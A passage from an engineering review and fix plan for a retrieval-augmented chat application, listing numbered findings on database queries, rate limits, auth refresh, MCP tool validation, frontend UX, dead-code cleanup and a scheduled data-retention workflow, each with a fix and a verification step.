    async with pool.acquire() as conn, conn.transaction():
        await conn.execute("SET LOCAL hnsw.iterative_scan = 'relaxed_order'")
        await conn.execute("SET LOCAL hnsw.max_scan_tuples = 20000")
        rows = await conn.fetch(query, *params)
    ```

    First confirm the version: `SELECT extversion FROM pg_extension WHERE extname = 'vector';`. If it is below `0.8.0`, instead `SET LOCAL hnsw.ef_search = 200` and note the limitation in `architecture.md`.

- **Verify:** `db` test: insert 300 seeded chunks with random embeddings and 3 user chunks near a query vector; assert all 3 user chunks appear in `search_chunks_dense(user_id=...)`. Compare with the old code to confirm the test fails before the fix.

### R2-LOG-04 · Medium · Chunk endpoints load every chunk with its embedding to return one

- **Where:** `apps/backend/app/db/neon.py::get_document_chunks`; callers `routes/documents.py::get_document_chunks` and the dedup branch of `upload_document` (`existing_chunks[:5]`); frontend `SourceDialog.tsx`.
- **Problem:** Opening one citation downloads all chunks of the document (up to 400, full text) and the database ships a 768-float vector per row, which the code then converts in a Python loop. The dedup path does the same just to take 5 previews.
- **Fix:**
    1. `get_document_chunks(document_id, limit: int | None = None)`: select without `embedding` and drop the vector-conversion block (the `DocumentChunk` validator already handles `None`). Use `LIMIT $2` when `limit` is given. The dedup branch passes `limit=5`.
    2. New `get_document_chunk(document_id, chunk_id)` and route `GET /api/documents/{document_id}/chunks/{chunk_id}` returning one `DocumentChunkWire` (with the same `require_document_access` check, both ids typed as `UUID`).
    3. `SourceDialog.tsx`: call the new endpoint, drop the `chunks.find(...)`.
    4. Delete the list route `GET /api/documents/{id}/chunks`, `DocumentChunksResponseWire` and its contract type (nothing else consumes them). Run `pnpm contracts:generate`.
- **Verify:** Update `test_documents.py` and `SourceDialog.test.tsx`. Assert a foreign user's chunk id returns `404`.

### R2-LOG-05 · Medium · Re-seeding changes chunk ids and breaks stored citations

- **Where:** `scripts/seed_kb.py` (`DELETE FROM document_chunks ...` then insert with `chunk.id = uuid4()`), `app/rag/parser.py` (random ids).
- **Problem:** Document ids are stable (`uuid5`) but chunk ids are random. Every re-seed invalidates `chunkId` inside saved `messages.reflection_summary.citations`, so old conversations show "This passage is no longer available." Also, if every seeded file produced zero chunks, `DELETE ... id <> ALL('{}')` deletes all seeded documents.
- **Fix:** `parse_markdown(..., chunk_id_namespace: UUID | None = None)`: when given, set `id=uuid5(chunk_id_namespace, str(chunk_index))`. `seed_kb.py` passes the document's uuid5. Replace delete-then-insert with `INSERT ... ON CONFLICT (id) DO UPDATE SET content = EXCLUDED.content, embedding = EXCLUDED.embedding, embedding_model = EXCLUDED.embedding_model, metadata = EXCLUDED.metadata` and delete only chunks of that document whose `chunk_index >= len(chunks)`. Abort with an error if `doc_models` is empty before the `DELETE`.
- **Verify:** Run the seed logic twice against a test DB (`db` test or by unit-testing the id generation): chunk ids are identical across runs.

### R2-LOG-06 · Medium · Conversation switch race

- **Where:** `apps/frontend/hooks/useChatHistory.ts::handleSelectConversationItem`.
- **Problem:** Click conversation A then B quickly. A's slower fetch resolves last and calls `handleSelectConversation(A, ...)`, replacing B's messages while B is highlighted.
- **Fix:** Keep a `selectionRef = useRef<string | null>(null)`. Set `selectionRef.current = conv.id` at the start of the handler. In the `.then` of the fetch, `if (selectionRef.current !== conv.id) return;`. Also reset `selectionRef.current = null` in `handleNewChat`.
- **Verify:** Hook/component test with two deferred promises resolved out of order; the last click wins.

### R2-LOG-07 · Medium · Persistence failure is invisible to the user

- **Where:** `apps/backend/app/routes/agent.py::persist_turn` (returns `None` on failure), `done.conversationId`; `apps/frontend/app/page.tsx::streamInto`.
- **Problem:** For a signed-in Google user a failed save yields `conversationId: null`. The frontend ignores the field, inserts the conversation into the sidebar anyway (optimistically, using `sessionId`), and caches the transcript locally. After a reload the chat is gone with no explanation.
- **Fix:** In `streamInto`, for Google users, if `result.conversationId` is falsy: do **not** add the item to `conversations`, and call `setChatNotice("This answer could not be saved to your history.")` (expose `setChatNotice` from `useChatHistory`, it already returns it). Keep the answer visible.
- **Verify:** `page.test.tsx`: a `done` payload with `conversationId: null` shows the notice and does not add a sidebar item.

### R2-LOG-08 · Low · Quota read path duplicates and races the SQL replenish logic

- **Where:** `apps/backend/app/db/neon.py::get_or_create_rate_limit`, `consume_rate_limit`.
- **Problem:** The "replenish after one hour" rule exists twice (SQL in `consume_rate_limit`, Python plus a second `UPDATE` in `get_or_create_rate_limit`). The read path is a read-modify-write and can overwrite a concurrent consume.
- **Fix:** Make the read path side-effect free: `INSERT ... ON CONFLICT (user_id) DO NOTHING` to guarantee a row, then `SELECT user_id, bucket_capacity, last_replenished_at, CASE WHEN last_replenished_at <= NOW() - INTERVAL '1 hour' THEN bucket_capacity ELSE tokens_remaining END AS tokens_remaining FROM rate_limit_buckets WHERE user_id = $1`. Return `resets_at` computed from the same row. No `UPDATE` in the read path.
- **Verify:** Existing quota tests pass; add a `db` test that reading an expired bucket reports full capacity without changing `last_replenished_at`.

### R2-LOG-09 · Low · `last_seen_at` is written on every request

- **Where:** `app/core/auth.py::get_current_user` (always `update_user_last_seen`), `app/routes/auth.py::get_current_user_profile` (a second update).
- **Problem:** Every authenticated request issues an `UPDATE users`, and `/api/auth/me` issues two. That is write amplification on a serverless database for a value only used by a 24 h pruning rule.
- **Fix:** Add `NeonDatabase.touch_user(user_id)`: `UPDATE users SET last_seen_at = NOW() WHERE id = $1 AND last_seen_at < NOW() - INTERVAL '5 minutes'`. Use it in `get_current_user`. In `/auth/me` keep only one call that also stores the IP (`update_user_last_seen(user.id, client_ip)`), and remove the other.
- **Verify:** Test that two calls within 5 minutes produce one write (spy on the connection).

### R2-LOG-10 · Low · `/api/rag/search` charges quota before validating input

- **Where:** `apps/backend/app/routes/rag.py::hybrid_search_documents`.
- **Problem:** `check_and_consume` runs before the `documentId` UUID parse and the `require_document_access` call, so a malformed or foreign `documentId` costs a token. The agent route does it in the right order.
- **Fix:** Move the `documentId` parsing and the access check above `check_and_consume`. Also use `documentId: UUID | None` in `HybridSearchRequestWire` so FastAPI returns `422` and the manual `try/except ValueError` can be deleted.
- **Verify:** Test: bad `documentId` returns `422` and the quota is unchanged.

### R2-LOG-11 · Low · `/api/auth/refresh` is never called; sessions die silently after 24 h

- **Where:** `apps/backend/app/routes/auth.py::refresh_token`, `refresh_limiter`, `MAX_SESSION_AGE_DAYS`, `REFRESH_PER_IP_PER_HOUR`; frontend (`grep -rn "auth/refresh" apps/frontend` finds nothing).
- **Problem:** Access tokens last 24 h and the refresh endpoint exists, but the frontend never uses it. After a day the user is signed out (see R2-UX-02). The whole refresh stack (endpoint, limiter, two settings, the `auth_time` claim and its cap) is dead weight. See **DECISION D2**.
- **Fix (recommended, if D2 = "wire it"):** In `auth-store.ts::initAuth`, after `/api/auth/me` succeeds, decode the token's `exp` (base64url middle segment, `JSON.parse`) and, if less than 12 hours remain, `POST /api/auth/refresh` and `applySession` with the result. Also refresh in the background every 6 hours while the tab is open. On failure do nothing (the 401 path handles it).
  Backend: in `refresh_token` call `enforce_ip_limit` **before** any database work (today it queries the quota first), and delete the second `decode_access_token` (read `auth_time` from the claims already decoded by the dependency by exposing them on the request, or decode once).
- **Fix (if D2 = "delete it"):** Delete `refresh_token`, `refresh_limiter`, `REFRESH_PER_IP_PER_HOUR`, `MAX_SESSION_AGE_DAYS`, the `auth_time` claim and their tests.
- **Verify:** Frontend test: a token with 2 hours left triggers exactly one refresh call on init and replaces the stored token.

### R2-LOG-12 · Low · MCP: unknown or malformed tool names are charged, mis-audited, or 500

- **Where:** `apps/backend/app/mcp/dispatch.py` (`tools/call`), `app/mcp/registry.py::call_tool`, `app/core/audit_log.py`.
- **Problem:** (a) `validate_arguments` returns `None` for an unknown tool, so the quota is consumed and an audit row is written for a call that did nothing. (b) `params["name"]` may be a non-string (for example an object), which makes `ARGUMENT_MODELS.get(name)` raise `TypeError: unhashable`, producing a generic `Internal error`. (c) `tool_audit_logs.tool_name` is `VARCHAR(100)`; a longer name makes the insert fail and the error is swallowed after two retries. (d) `validate_arguments` runs twice (dispatch and `call_tool`).
- **Fix:** In `tools/call`: require `isinstance(tool_name, str) and 0 < len(tool_name) <= 100`, else `INVALID_PARAMS`. Check `tool_name in ARGUMENT_MODELS` and return `INVALID_PARAMS "Unknown tool"` **before** `check_and_consume`. Validate once: have `dispatch` call `validate_arguments` and pass the parsed model into `call_tool(parsed, ...)`.
- **Verify:** Tests: unknown tool and non-string name return `-32602` and do not change the quota; a 500-character name returns `-32602`.

### R2-LOG-13 · Low · `/api/health` runs three DB queries per unauthenticated call

- **Where:** `apps/backend/app/routes/health.py`.
- **Problem:** Each call checks out a connection and runs `SELECT 1`, `SHOW server_version` and a `pg_extension` scan, even in production where the extra data is discarded. Anyone can use it to exhaust the 10-connection pool.
- **Fix:** Run `SELECT 1` always. Run the version and extension queries only `if settings.is_dev`. Use `asyncio.wait_for(..., timeout=2)` around the acquire so a saturated pool reports `unhealthy` instead of hanging.
- **Verify:** Test that in production mode only one query runs (fake pool counting `fetchval` calls).

### R2-LOG-14 · Medium · Missing indexes and constraints; dead `hitl_approved` column

- **Where:** `migrations/20260901000000_core_schema.sql`; `app/core/audit_log.py`.
- **Problem:** (a) No index on `documents(user_id)`; the document list, count, and dedup queries scan the table. (b) `agent_conversations.user_id` and `rate_limit_buckets.user_id` are nullable, so orphan rows are possible and invisible. (c) No `CHECK (tokens_remaining >= 0)`. (d) `tool_audit_logs.hitl_approved` is always `TRUE` since HITL was removed (dead column and parameter). The trigger function compares it, so it cannot simply be dropped.
- **Fix:** New migration `20261103000100_constraints_and_cleanup.sql` (separate from R2-SEC-07's file):

    ```sql
    CREATE INDEX IF NOT EXISTS idx_documents_user ON documents(user_id);
    DELETE FROM agent_conversations WHERE user_id IS NULL;
    ALTER TABLE agent_conversations ALTER COLUMN user_id SET NOT NULL;
    DELETE FROM rate_limit_buckets WHERE user_id IS NULL;
    ALTER TABLE rate_limit_buckets ALTER COLUMN user_id SET NOT NULL;
    ALTER TABLE rate_limit_buckets ADD CONSTRAINT rate_limit_tokens_nonneg CHECK (tokens_remaining >= 0);
    -- Rewrite the trigger function WITHOUT hitl_approved first, then drop the column.
    CREATE OR REPLACE FUNCTION tool_audit_logs_guard() RETURNS trigger AS $$ ... $$ LANGUAGE plpgsql;
    ALTER TABLE tool_audit_logs DROP COLUMN IF EXISTS hitl_approved;
    ```

    (Copy the existing function body and remove `NEW.hitl_approved`/`OLD.hitl_approved` from both tuples.) Then remove `hitl_approved` from `audit_log.py` (`INSERT_QUERY`, `SELECT_COLUMNS`, `_row_to_entry`, the parameter) and from every test and caller.

- **Verify:** `tests/test_migrations.py` still passes on a fresh database; the audit append-only tests still pass; the trigger still rejects `UPDATE`/`DELETE`.

---

## 4. UI/UX findings

### R2-UX-01 · Medium · Composer has no length limit or counter

- **Where:** `apps/frontend/components/composer.tsx`, `lib/limits.ts`; backend `AgentStreamRequestWire.query` (`max_length=2000`).
- **Problem:** A user who pastes 3000 characters sees the raw server message "String should have at most 2000 characters" after sending.
- **Fix:** Add `export const MAX_QUERY_CHARS = 2000;` to `lib/limits.ts` (with the "keep in sync" comment like the upload limit). Put `maxLength={MAX_QUERY_CHARS}` on the textarea. Show `"{n}/2000"` (class `text-xs text-muted-foreground`, `text-destructive` at 100 %) only when `prompt.length > 1600`. Add `aria-describedby` pointing to the counter.
- **Verify:** Composer test: typing past the limit is blocked, and the counter appears at 1601 characters.

### R2-UX-02 · Medium · Expired session logs the user out with no explanation

- **Where:** `apps/frontend/lib/auth-store.ts` (`clearSession` via `setOnUnauthorizedCallback`), `initAuth` catch.
- **Problem:** On a `401` (token expired after 24 h or revoked) the store silently resets and the header flips to "Sign In". The user does not know why their chats vanished.
- **Fix:** Add `sessionNotice: string | null` to the store. Set it in the unauthorized callback to `"Your session expired. Please sign in again."` (not on manual logout). Render it in `ChatCanvas` as a `role="status"` banner with a "Sign in" button, and clear it on the next successful login.
- **Verify:** Test: a `401` from any `apiClient` call sets the notice; logout does not.

### R2-UX-03 · Medium · Mobile layout problems

- **Where:** `apps/frontend/components/app-header.tsx` (quota badge `hidden sm:flex`; `width: ${quotaRemaining / bucketCapacity}`), `app/page.tsx` (`h-screen`), `styles/globals.css` (`min-height: 100vh`), `app/layout.tsx` (`min-h-screen`).
- **Problem:** (a) Phones never see the remaining quota except inside the profile popover. (b) `100vh` includes the collapsing browser toolbar on mobile Safari/Chrome, so the composer is pushed under the browser UI. (c) While `bucketCapacity` is `0` (before `/auth/me` answers) the width is `NaN%`.
- **Fix:** (a) Show a compact `"{remaining}/{capacity}"` pill below `sm` (same data, smaller). (b) Use `h-dvh` / `min-h-dvh` and `min-height: 100dvh`. (c) `const pct = bucketCapacity > 0 ? Math.min(100, Math.max(0, (quotaRemaining / bucketCapacity) * 100)) : 0;`.
- **Verify:** Test the header with `bucketCapacity = 0` (no `NaN` in style). Manual check at 375 px width.

### R2-UX-04 · Low · Signing in from a guest session abandons guest uploads

- **Where:** `app/db/neon.py::upsert_google_user` creates a new user id; guest data stays on the guest row, which the prune job deletes after 24 h.
- **Problem:** A guest uploads a document, then signs in with Google: the document list shows nothing, with no warning.
- **Fix:** Cheapest option (KISS): in `SignInDialog`, when the current user is a guest and has uploaded documents, show: "Signing in starts a fresh workspace. Documents uploaded as a guest will be deleted." (pass `hasGuestDocuments` from `page.tsx`, derived from `docs.some(d => !d.isSeeded)`). Do not build migration of guest data (YAGNI).
- **Verify:** Dialog test with and without guest documents.

### R2-UX-05 · Low · Accessibility noise

- **Where:** `components/chat-canvas.tsx` (`<main role="main">`), `workspace-sidebar.tsx` and `observability-panel.tsx` (`<aside role="complementary">`), `app-header.tsx` (`<header role='banner'>`), `components/ui/dialog.tsx` (`role="dialog" aria-modal="true"` duplicates Radix), `styles/globals.css` (`:focus-visible { outline ... !important }`).
- **Problem:** Redundant ARIA roles add lint noise and no value. The global `!important` outline overrides every component-level focus style (`focus-visible:ring-*`), so two focus systems fight and cannot be tuned.
- **Fix:** Remove the redundant `role` attributes. In `dialog.tsx` drop `role` and `aria-modal` (Radix sets them). In `globals.css` remove `!important` and keep the rule as the default (components can then override with Tailwind classes).
- **Verify:** Existing a11y/role tests are updated to query by element (`getByRole('main')` still works because `<main>` has the implicit role).

### R2-UX-06 · Low · Internal jargon and a wrong protocol label in end-user UI

- **Where:** `workspace-sidebar.tsx` (badge `v2`, title "MCP Protocol"), `public/site.webmanifest` and `app/layout.tsx` description ("MCP v2"), `observability-panel.tsx` ("LangGraph DAG Pipeline", "Execution Wire Logs", "Wire"), `McpInspector.tsx` ("Raw Wire"), backend router tag "Model Context Protocol (MCP v2)".
- **Problem:** The server speaks MCP protocol version `2024-11-05`; "v2" is not a real version and misleads integrators. The panel names are fine for a developer showcase but confusing for others.
- **Fix:** Replace the `v2` badge with the real protocol date, remove "MCP v2" from the manifest/metadata/router tag (say "Model Context Protocol"). Rename user-visible labels: "Pipeline", "Run log", "Raw messages". Keep the observability panel itself.
- **Verify:** Update tests that assert on the old strings.

### R2-UX-07 · Low · Arbitrary pixel values violate the project's own rule

- **Where:** `.agents/specs/AGENTs.md` §4 forbids "arbitrary hardcoded pixel widths". Found: `min-w-[70px]` (page.tsx), `w-[1px]`, `min-h-[300px]`, `min-h-[220px] max-h-[480px]` (MermaidViewer), `max-h-[340px]` (observability-panel), `sm:max-w-[480px]`, `sm:text-[13px]`, `max-w-[220px] sm:max-w-[260px]` (sign-in-dialog), `min-h-[44px]`/`min-h-[36px]`/`min-h-[48px]` (button, dialog, switch), `max-h-[80vh]`/`[85vh]`.
- **Fix:** Replace with Tailwind scale utilities (`min-w-18`, `w-px`, `min-h-72`, `max-h-80`, `sm:max-w-md`, `text-xs`, `min-h-11`, `min-h-9`, `min-h-12`, `max-h-[80dvh]` -> `max-h-4/5` or a token). For heights that need `vh`, define a `--spacing-*`/`--height-*` token in `@theme`.
- **Verify:** `grep -rnE "\[[0-9.]+(px|vh|rem)\]" apps/frontend/components apps/frontend/app --include=*.tsx` returns nothing (ignore tests). Visual spot check.

### R2-UX-08 · Low · Theme toggle performs side effects inside a state updater

- **Where:** `apps/frontend/app/page.tsx::handleToggleTheme`.
- **Problem:** `setIsDarkTheme((prev) => { ...document.documentElement.classList..., localStorage.setItem(...) })` runs side effects in an updater. React may call updaters twice (StrictMode) and the React Compiler assumes purity. Also `localStorage.setItem` is not in a `try/catch` (throws in private mode).
- **Fix:** Compute `next` from the current state outside the updater, call `setIsDarkTheme(next)`, and apply the DOM class and storage write in a `useEffect([isDarkTheme])` with a `try/catch`. Skip the first run so the inline script's value is not overwritten before `isDarkTheme` is read from the DOM.
- **Verify:** Toggle test checks the class and storage; storage failure does not throw.

### R2-UX-09 · Low · Chat search is title-only on the client while the server search is unused

- **Where:** `SidebarChatHistory.tsx` (filters `title`/`lastSnippet` locally), `routes/chat.py` `q` parameter and `neon.list_conversations(search_term)`.
- **Problem:** Two search implementations; the server one (`ILIKE` over every message, no wildcard escaping, no index) is never called, and the client one cannot find text inside answers.
- **Fix:** See R2-CLN-01: delete the server-side `q`. Keep the client filter and update its placeholder to "Search titles...".
- **Verify:** `SidebarChatHistory.test.tsx` placeholder assertion updated.

---

## 5. Cleanup: dead, unused and redundant code (YAGNI / DRY / KISS / SOLID)

### R2-CLN-01 · Medium · Backend dead and redundant code

Do these as one commit per bullet group, running the gates each time.

- **Unused search feature:** delete `q` from `routes/chat.py::list_chat_history`, `search_term` from `NeonDatabase.list_conversations` and its `ILIKE`/`EXISTS` SQL (also removes an unescaped-wildcard and sequential-scan risk). Keep `limit`. Update `test_chat_history.py`.
- **`AgentGraph.__init__(db=...)`:** `self.db` is never used. Remove the parameter and attribute and the `NeonDatabase`/`neon_db` imports in `agent/graph.py` if they become unused.
- **`RateLimitBucket.client_ip`:** the table has no `client_ip` column and nothing reads the field. Remove it (the model ignores extra DB columns such as `id`, so nothing else changes).
- **`TokenBucketLimiter.refund(is_guest)`** parameter (handled in R2-LOG-01) and `check_and_consume(client_ip)` stays.
- **`DocumentChunk.convert_vector_to_list`:** the `to_numpy` branch is unreachable, and `neon.get_document_chunks` re-implements the same conversion (removed by R2-LOG-04). Keep only the `tolist` and iterable cases.
- **`hybrid_search.compute_rrf`:** (a) the dense and sparse loops are copy-pasted; make one helper `_accumulate(scores, items, weight, rank_key, score_field, score_key)`. (b) the metadata aliases `header_path`/`headerPath` and `start_line`/`startLine`: the parser only writes camelCase (`headerPath`, `startLine`, `endLine`), so drop the snake_case fallbacks. (c) move `import json` to module level. (d) the default weights `0.5/0.5/60` are repeated in `compute_rrf`, `HybridSearchEngine.search`, `HybridSearchRequestWire` and `retriever_node` (0.6/0.4/60): define `DEFAULT_DENSE_WEIGHT`, `DEFAULT_SPARSE_WEIGHT`, `DEFAULT_RRF_K` once in `hybrid_search.py` and reuse.
- **`routes/chat.py`:** the module docstring still mentions the removed "seeded knowledge-base listing". The `hasattr(x, "isoformat")` branches in `conversation_to_wire`, `message_to_wire`, and `routes/documents.py::document_to_wire`/`chunk_to_wire` are dead (asyncpg always returns `datetime`); replace with `.isoformat()`. `get_chat_conversation` hand-builds a conversation dict instead of calling `conversation_to_wire` and omits `updatedAt`: call the shared function (fetch `updated_at` in `get_conversation_with_messages`).
- **`total` in `ChatHistoryResponseWire`** equals `len(conversations)` and is misleading (not a total count). Remove the field (and from the contract), or compute a real `COUNT(*)`. Prefer removal (YAGNI).
- **JWT claims `role` and `is_guest`** in `session_claims` are never read by the server (it reloads the user). Remove them; keep `sub`, `tv`, `auth_time`.
- **`get_current_user`/`refresh_token`** decode the token twice (see R2-LOG-11).
- **`hash_device_id` docstring** says "constant-time"; a plain SHA-256 is not a constant-time operation. Fix the docstring.
- **`Settings.KNOWLEDGE_BASE_DIR`** duplicates the module constant `KNOWLEDGE_BASE_DIR`; keep one (the module constant, used by the MCP registry).
- **Unused `__init__` re-exports:** `app/agent/__init__.py` and `app/mcp/__init__.py` export names nobody imports through the package. Reduce them to docstrings.
- **`numpy` is declared as a direct dependency** but only tests import it and `pgvector` already depends on it. Run `uv tree --invert --package numpy`; if `pgvector` pulls it, remove it from `[project].dependencies` and add it to the `dev` group.
- **`mcp/dispatch.py::dispatch_mcp_method`:** `elif` chain after `return`s; use early returns or a dict of handlers. (Do this only together with R2-LOG-12 to keep the diff reviewable.)
- **`mcp.py::mcp_messages_endpoint`:** the same "put on queue or raise 429" block appears three times, and the `HTTPException` raised inside `try` is caught by the broad `except Exception`. Extract `_enqueue(queue, response)` that raises 429, call it outside the `try`.
- **Verify:** all gates; `ruff` reports no unused imports; grep shows no remaining references to deleted names.

### R2-CLN-02 · Low · Frontend dead code and unused exports

- `apiClient` option `params` (≈12 lines building a `URL`) is never passed by any caller. Delete it and the `ApiClientOptions.params` field (keep `timeoutMs`).
- `useAgentStream` returns `streamError` (unused by `page.tsx`) and accepts `documentId` (never passed). Remove both unless **D4** adds a document selector. Remove the unused `AgentRunResult` re-wrapping if it ends up trivial.
- `useChatHistory` returns `setChatNotice`, `loadConversations` that `page.tsx` never uses (note: R2-LOG-07 starts using `setChatNotice`). `handleSelectConversation` has an unused `_title` parameter; remove it.
- Unused primitives in `components/ui`: `CardFooter`, `DialogFooter`, `DialogClose`, `PopoverAnchor`; unused variants: Button `destructive`, `link`, size `lg`; Badge `default`, `secondary`, `success`, `warning`, `destructive`. Verify each with `grep` first, then delete. (Low value; skip any that a planned change will use.)
- Unused CSS tokens in `styles/globals.css` and the `@theme` block: `--dark-pill*`, `--info*`.
- `apps/frontend/.gitignore` contains only `.vitest/`, which the root `.gitignore` already ignores. Delete the file.
- `packages/contracts/package.json` declares `main`/`exports` to `dist/` and a `build` script, but the frontend resolves the package through the `tsconfig` `paths` alias to `src/` and only imports types. CI's `pnpm --filter @nexusagent/contracts build` step is therefore unnecessary. Remove that CI step (R2-OPS-04) and keep `typecheck`.
- **Verify:** typecheck, lint (the unused-export rule), tests.

### R2-CLN-03 · Medium · Hand-written wire mappers (DRY)

- **Where:** `routes/agent.py` (`plan_step_to_wire`, `citation_to_wire`, `warning_to_wire`), `routes/documents.py` (`document_to_wire`, `chunk_to_wire`), `routes/chat.py` (`conversation_to_wire`, `message_to_wire`), `routes/rag.py` (a 14-field copy of `HybridSearchResult` into `HybridSearchResultWire`), `routes/auth.py::user_to_session`.
- **Problem:** Seven mappers re-type the same snake_case -> camelCase conversion, and `HybridSearchResultWire` duplicates `HybridSearchResult`. Each new field needs edits in three places.
- **Fix:** In `db/models.py` add
    ```python
    from pydantic.alias_generators import to_camel
    class WireModel(BaseModel):
        model_config = ConfigDict(alias_generator=to_camel, populate_by_name=True, from_attributes=True)
    ```
    Make the `*Wire` classes inherit from it with snake_case field names, return model instances (FastAPI serialises with aliases by default), and delete the mapper functions. Do it one router at a time (agent SSE, documents, chat, rag, auth), running `pnpm contracts:generate` after each and checking that `git diff packages/contracts` is empty (the generated TypeScript must not change). For the SSE models call `model_dump_json(by_alias=True)`.
- **Verify:** Contracts diff is empty; all existing route tests pass unchanged.

### R2-CLN-04 · Low · Message cache logic duplicated in four places

- **Where:** `app/page.tsx::streamInto` (writes `nexusagent_msgs_*` with fake `createdAt: new Date()` and without warnings), `useChatHistory.ts` (`prefetchMessages`, `handleSelectConversationItem`, `handleDeleteConversation`), `auth-store.ts` (`CHAT_CACHE_PREFIXES`).
- **Fix:** Create `lib/chat-cache.ts` exporting `readMessages(id)`, `writeMessages(id, records)`, `removeMessages(id)`, `readConversations(userId)`, `writeConversations(userId, list)`, `clearChatCache()`, each wrapping `localStorage` in `try/catch`. Use them from the hook and the store. `page.tsx` must stop writing to localStorage: after a stream completes, call `prefetchMessages` with a forced refresh (or invalidate the memory cache entry) so the next open fetches the server copy with real timestamps.
- **Verify:** Unit test for `chat-cache`; `grep -rn "nexusagent_msgs_" apps/frontend --include=*.ts --include=*.tsx` only matches `lib/chat-cache.ts`.

### R2-CLN-05 · Low · Graph topology duplicated in `routes/agent.py`

- **Where:** `routes/agent.py::next_node` hard-codes `{"retriever": "grounding", "grounding": "synthesizer"}` and calls `route_after_planner`; `agent/graph.py::_build_graph` defines the same edges.
- **Problem:** Adding a node requires editing both; they can silently disagree.
- **Fix:** In `graph.py` define `PIPELINE_NEXT = {"retriever": "grounding", "grounding": "synthesizer"}` and `def next_node(finished, state)` there, use it in `_build_graph` (`add_edge` loop) and import it in `routes/agent.py`. Delete the copy.
- **Verify:** `test_agent_dag.py` still asserts the `node_start` order for greeting, out-of-scope and architectural queries.

### R2-CLN-06 · Medium · `generate_agent_stream` and route-to-route imports violate SRP/DIP

- **Where:** `routes/agent.py::generate_agent_stream` (≈180 lines: builds state, formats SSE, runs the graph, refunds quota, persists, handles cancellation, all in nested closures); `routes/agent.py` and `routes/rag.py` import `require_document_access` from `routes/documents.py`.
- **Problem:** One function has six reasons to change and is hard to test; routers depend on each other instead of on a shared layer.
- **Fix:** (1) Move `require_document_access` to `app/core/access.py` and import it from there in the three routers. (2) Move `persist_turn` and the title rule (`TITLE_MAX_CHARS`) to `app/services/conversations.py`. (3) Split `generate_agent_stream` into: `sse.py` (`format_sse` and the node->event mapping, one function per node), `AgentRun` (a small class holding `tokens_sent`, `refund_if_charged`, `run()`), and the thin generator. Behaviour must not change; do this refactor **after** R2-SEC-03, R2-LOG-02 and R2-LOG-07 so those diffs stay small.
- **Verify:** `test_agent_stream.py`, `test_agent_dag.py` and the security tests pass unchanged.

### R2-CLN-07 · Low · `parser.py` duplicated chunk construction and double search

- **Where:** `apps/backend/app/rag/parser.py::parse_markdown` (the `if nodes:` and `else:` branches build identical `meta`/`DocumentChunk` code), `_locate` (calls `find_chunk_start` and then `compute_line_positions`, which calls it again).
- **Fix:** Extract `_make_chunk(document_id, index, text, headers, start, end, extra)`; make the fallback branch produce `[(text, [])]` pairs and feed one loop. Make `compute_line_positions` accept the already-found index (or return `(start, end, idx)`) so the search runs once per chunk. Behaviour and metadata keys must stay identical.
- **Verify:** `test_documents.py` parser tests unchanged and green.

### R2-CLN-08 · Low · Placeholder scaffolding files with `TODO` content

- **Where:** `.agents/rules/00-identity.md`, `01-guide.md`, `02-standard.md`, `.agents/logs.md`, `.agents/context/README.md`, `.agents/context/decisions.jsonl` (empty), `.agents/skills/decision-layer/.gitkeep`, `.agents/skills/remotion/.gitkeep`, `.agents/specs/aim.md`, `.agents/specs/versions.md`.
- **Problem:** Eleven files whose entire content is "TODO: ..." or empty. They mislead readers and contradict the project's own "no phantom implementations" rule. `README.md` advertises them in the tree.
- **Fix:** Delete the files and folders above (except keep `.agents/specs/*.md` that have content). Update the `README.md` "Monorepo Architecture" tree and the "Master Documentation Index" accordingly. Do **not** delete `.agents/specs/AGENTs.md`, `architecture.md`, `design.md`, `features.md`. See **D5** if the owner wants to keep any as real documents.
- **Verify:** `git ls-files .agents` lists only the four real specs; README has no dead links (`grep -n "\.agents" README.md`).

### R2-CLN-09 · Low · MCP resource table duplicated and incomplete

- **Where:** `app/mcp/registry.py`: `STATIC_RESOURCES` and the `filename_map` inside `read_resource`.
- **Problem:** URIs are listed twice (drift risk) and only 2 of the 4 knowledge-base files are exposed (`artificial_analysis.md` and `openrouter_metrics.md` are searchable but not readable as resources).
- **Fix:** One table: `RESOURCES = [(ResourceDefinition(...), "benchlm_evals.md"), ...]`, built from the four files in `knowledge_base/benchmarks/`; `get_resources()` and `read_resource()` both derive from it. Add `benchmark://artificial-analysis` and `benchmark://openrouter-metrics`. Read the file with `asyncio.to_thread` so the event loop is not blocked.
- **Verify:** `test_mcp.py`: `resources/list` returns 4 entries and `resources/read` returns the content for each.

### R2-CLN-10 · Low · `seed_kb.py` duplicates the document insert SQL

- **Where:** `scripts/seed_kb.py` (hand-written `INSERT INTO documents` / `document_chunks`), `app/db/neon.py::create_document_with_chunks`.
- **Fix:** Add `NeonDatabase.replace_seeded_documents(items: list[tuple[Document, list[DocumentChunk]]])` that does the whole transactional upsert (with the stable ids from R2-LOG-05), and make the script call it. Remove the SQL strings from the script.
- **Verify:** Run the script against a test database (or a `db` test) twice; counts are stable.

---

## 6. Operations, CI, documentation and tests

### R2-OPS-01 · Medium · Retention job (privacy promise) is not scheduled

- **Where:** `scripts/prune_guests.py`, `README.md` ("run daily (cron, Render Cron Job, or a scheduled CI job)"), `apps/frontend/app/privacy/page.tsx` ("Inactive guest accounts and their documents are deleted after 24 hours", "Tool audit records are deleted after 30 days").
- **Problem:** The policy states a guarantee; nothing in the repository runs the job. Until someone sets up a cron, guest data and audit rows (which contain user query text) are kept forever.
- **Fix:** Add `.github/workflows/maintenance.yml`:

    ```yaml
    name: Maintenance
    on:
        schedule:
            - cron: '17 3 * * *'
        workflow_dispatch:
    permissions:
        contents: read
    jobs:
        prune:
            runs-on: ubuntu-latest
            steps:
                - uses: actions/checkout@v4
                - uses: astral-sh/setup-uv@v5
                - run: uv sync --frozen --project apps/backend
                - run: uv run --project apps/backend python scripts/prune_guests.py
                  env:
                      ENVIRONMENT: production
                      NEON_DATABASE_URL: ${{ secrets.NEON_DATABASE_URL }}
                      JWT_SECRET_KEY: ${{ secrets.JWT_SECRET_KEY }}
                      GOOGLE_CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
    ```

    (The script imports `app.config`, which refuses to start in production without those values. Alternatively set `ENVIRONMENT=development` for this job and pass only `NEON_DATABASE_URL`.) Pin action versions per R2-OPS-04. Add the same to the README "Maintenance" section. Add the cleanup of `ip_rate_events` if R2-SEC-06 (DB option) is done.

- **Verify:** `workflow_dispatch` run succeeds and logs "Cleanup complete". Add a `db` test that `prune_expired_guests(ttl_hours=1)` removes an old guest and keeps a fresh one (may already exist).

### R2-OPS-02 · Medium · CI is red on `master`

